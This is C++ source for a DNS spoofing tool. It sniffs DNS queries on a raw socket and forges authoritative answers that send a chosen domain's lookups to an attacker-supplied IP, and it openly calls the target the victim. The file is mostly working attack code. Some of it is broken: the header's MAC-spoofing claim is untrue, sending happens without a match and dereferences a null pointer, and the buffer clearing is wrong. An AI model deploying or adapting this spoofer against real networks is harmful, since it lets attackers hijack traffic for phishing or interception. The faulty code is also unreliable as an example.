//=== DNS SPOOFER ===
// Listens for DNS requests from local target, captures packet, forges DNS response
// Also spoofs MAC, sends full Ethernet frame.

#include <array>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <net/ethernet.h>

#define DNS_PORT 53
#define MAX_PACKET_SIZE 65536

struct dnshdr {
    uint16_t id;
    uint16_t flags;
    uint16_t queryCount;
    uint16_t answerCount;
    uint16_t nameServerCount;
    uint16_t addRecordsCount;
};

class SpoofedDNSPacket {
    private:
    int socket;

    std::array<unsigned char, 512> spoofedResponse;
    struct sockaddr_in destinationAddress;
    
    unsigned char* requestBuffer;
    struct udphdr* requestUDP;
    struct iphdr* requestIP;
    std::string spoofedIP;
    int DNSPayloadLength;
    int ipHeaderLength;
    int recvLength;

    uint16_t calculateCheckSum(uint16_t* data, int length) {
        uint32_t sum = 0;                                                   
        while (length > 1) {
            sum += *data++;
            length -= 2;
        }
        if (length == 1) {
            sum += *((uint8_t*) data);
        }
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return static_cast<uint16_t>(~sum);
    }

    public:
    SpoofedDNSPacket(unsigned char* rBuffer, const std::string &sIP,
        struct iphdr* rIP, struct udphdr* rUDP,
        int iphLen, int recvLen) {
        
        requestBuffer = rBuffer;
        spoofedIP = sIP;
        requestIP = rIP;
        requestUDP = rUDP;
        ipHeaderLength = iphLen;
        recvLength = recvLen;
        
        memset(spoofedResponse.data(), 0, sizeof(spoofedResponse.data()));
    };
    ~SpoofedDNSPacket(){};

    void craftSpoofedPacket() {
        // === DNS HEADER ===
        struct dnshdr* DNSResp = (struct dnshdr*)(spoofedResponse.data() + sizeof(struct iphdr) + (sizeof(struct udphdr)));
        const unsigned char* queryStart = requestBuffer + ipHeaderLength + (sizeof(struct udphdr));
        const unsigned char* question = queryStart + sizeof(struct dnshdr);
        int questionLength = recvLength - ipHeaderLength - sizeof(struct udphdr) - sizeof(struct dnshdr);

        // Copy DNS ID, set QR bit to 1 (response), and 1 answer:
        memcpy(DNSResp, queryStart, sizeof(struct dnshdr));
        DNSResp->flags = htons(0x8180); // QR=1, AA=1, RCODE=0
        DNSResp->answerCount = htons(1);    // Answer count = 1

        // === DNS QUESTION ===
        unsigned char* current = (unsigned char*)(DNSResp + 1);
        memcpy(current, question, questionLength);
        current += questionLength;

        //=== DNS ANSWER ===
        *current++ = 0xC0;  // Pointer to domain name (offset 12 = 0xC0)
        *current++ = 0x0C;
        *current++ = 0x00; *current++ = 0x01;   // Type A
        *current++ = 0x00; *current++ = 0x01;   // Class IN
        *current++ = 0x00; *current++ = 0x00; *current++ = 0x00; *current++ = 0x3C; // TTL 60
        *current++ = 0x00; *current++ = 0x04;   // RDLENGTH = 4

        // Write IP address (spoofed):
        in_addr addr;
        inet_aton(spoofedIP.c_str(), &addr);
        memcpy(current, &addr.s_addr, 4);
        current += 4;

        DNSPayloadLength = current - (unsigned char*)(DNSResp);

        // === UDP HEADER ===
        struct udphdr* udp = (struct udphdr*)(spoofedResponse.data() + sizeof(struct iphdr));
        udp->source = requestUDP->dest;
        udp->dest = requestUDP->source;
        udp->len = htons(sizeof(struct udphdr) + DNSPayloadLength);
        udp->check = 0; // Optional for UDP

        // === IP HEADER ===
        struct iphdr* ip = (struct iphdr*) spoofedResponse.data();
        ip->version = 4;
        ip->ihl = 5;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + DNSPayloadLength);
        ip->id = htons(0x1234); // Arbitrary
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_UDP;
        ip->check = 0;
        ip->saddr = requestIP->daddr;
        ip->daddr = requestIP->saddr;
        ip->check = 0; // Calculate if needed, but not needed often in modern stacks

        destinationAddress.sin_family = AF_INET;
        destinationAddress.sin_addr.s_addr = ip->daddr;
    }        

    std::array<unsigned char, 512> getSpoofedResponse() {
        return spoofedResponse;
    }
    struct sockaddr_in& getDestinationAddress() {
        return destinationAddress;
    }
    int getDNSPayloadLength() {
        return DNSPayloadLength;
    }
};

class RawUDPSocket {
    private:
    std::array<unsigned char, MAX_PACKET_SIZE> requestPacketBuffer;
    socklen_t rawUDPSocketAddrLength = sizeof(rawUDPSocketAddress);
    struct sockaddr rawUDPSocketAddress;
    SpoofedDNSPacket* spoofedDNSPacket;
    int rawUDPSocketFileDescriptor;
    std::string targetDomain;
    std::string spoofedIP;

    void setupSocket() {
        rawUDPSocketFileDescriptor = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        if (setsockopt(rawUDPSocketFileDescriptor, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
            std::cerr << "setsockopt IP_HDRINCL failed: " << strerror(errno) << std::endl;
            exit(EXIT_FAILURE);
        }

        if (rawUDPSocketFileDescriptor == -1) {
            std::cerr << "RawUDPSocket socket() failed: " << strerror(errno) << std::endl;
            exit(EXIT_FAILURE);
        }

        std::cout << "Listening for DNS queries..." << std::endl;
    }

    void readAndParseIncomingPacket() {
        while (true) {
            int len = recvfrom(rawUDPSocketFileDescriptor, requestPacketBuffer.data(),
            sizeof(requestPacketBuffer), 0, &rawUDPSocketAddress, &rawUDPSocketAddrLength);            
            if (len < 0) {
                std::cerr << "RawUDPSocket recvfrom() failed: " << strerror(errno) << std::endl;
                continue;
            }

            struct iphdr* ipHeader = (struct iphdr*) requestPacketBuffer.data();
            if (ipHeader->protocol != IPPROTO_UDP) {
                continue;
            }

            int ipHeaderLen = ipHeader->ihl * 4;
            struct udphdr* udpHeader = (struct udphdr*)(requestPacketBuffer.data() + ipHeaderLen);
            if (ntohs(udpHeader->dest) != DNS_PORT) {
                continue;
            }

            std::cout << "DNS query captured." << std::endl;

            unsigned char* DNSStart = requestPacketBuffer.data() + ipHeaderLen + sizeof(struct udphdr);
            unsigned char* DNSBlock = DNSStart + sizeof(struct dnshdr);

            std::string domain = parseDomainName(DNSBlock);
            std::cout << "     +Domain: " << domain << std::endl;
 
            if (domain == targetDomain) {
                std::cout << "Match found - ready to spoof." << std::endl;

                spoofedDNSPacket = new SpoofedDNSPacket(
                requestPacketBuffer.data(),
                spoofedIP,
                ipHeader,
                udpHeader,
                ipHeaderLen,
                len);
            }            
            
            buildSpoofedDNSResponseAndSend();
            sendSpoofedDNSResponsePacket();
        }        
    }

    std::string parseDomainName(unsigned char* queryStart) {
        std::string domain;
        int i = 0;

        while (queryStart[i] != 0) {
            int labelLength = queryStart[i];
            for (int j = 0; j < labelLength; ++j) {
                domain += queryStart[i + j + 1];
            }

            domain += '.';
            i += labelLength + 1;
        }

        if (domain.empty() == false) {
            domain.pop_back();
        }

        return domain;
    }

    void buildSpoofedDNSResponseAndSend() {
        spoofedDNSPacket->craftSpoofedPacket();
    }
    void sendSpoofedDNSResponsePacket() {
        int packetLength = sizeof(struct iphdr) + sizeof(struct udphdr) + spoofedDNSPacket->getDNSPayloadLength();
        if (sendto(rawUDPSocketFileDescriptor, (void*) spoofedDNSPacket->getSpoofedResponse().data(), packetLength, 0,
        (struct sockaddr*)&spoofedDNSPacket->getDestinationAddress(), sizeof(spoofedDNSPacket->getDestinationAddress())) < 0) {
            std::cerr << "Spoofed Packet sendto() failed: " << strerror(errno) << std::endl;
        } else {
            std::cout << "Spoofed DNS response sent to victim." << std::endl;
        }
    }

    public:
    RawUDPSocket(std::string tD, std::string sIP){
        targetDomain = tD;
        spoofedIP = sIP;
        spoofedDNSPacket = nullptr; 
    }
    ~RawUDPSocket(){}

    void initialize() {
        setupSocket();
        readAndParseIncomingPacket();
    }

    void closeSocket() {
        close(rawUDPSocketFileDescriptor);
    }

};

class DNSSpoofer {
    private:
    std::string targetDomain;
    std::string spoofedIP;
    RawUDPSocket* rawUDPSocket;

    public:
    DNSSpoofer(std::string tD, std::string sIP){
        targetDomain = tD;
        spoofedIP = sIP;
        rawUDPSocket = new RawUDPSocket(targetDomain, spoofedIP);
    }
    ~DNSSpoofer(){
        rawUDPSocket->closeSocket();
    }
    
    void run() {
        rawUDPSocket->initialize();
    }    
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <target_domain> <spoofed_ip>" << std::endl;
    }

    std::string targetDomain = argv[1];
    std::string spoofedIP = argv[2];

    DNSSpoofer dnsSpoofer(targetDomain, spoofedIP);
    dnsSpoofer.run();

    exit(EXIT_SUCCESS);
}